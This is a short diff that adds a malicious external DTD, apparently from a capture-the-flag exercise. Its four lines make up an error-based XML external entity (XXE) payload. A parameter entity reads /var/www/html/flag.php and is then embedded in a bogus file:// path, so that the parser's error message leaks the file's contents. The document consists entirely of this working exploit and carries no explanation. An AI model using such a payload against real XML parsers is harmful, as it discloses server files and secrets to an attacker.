@@ -1,0 +1,4 @@
+<!ENTITY % data SYSTEM "file:///var/www/html/flag.php">
+<!ENTITY % xxe "<!ENTITY &#37; xxe-url SYSTEM 'file:///i-dont-exist/%data;'>">
+%xxe;
+%xxe-url;
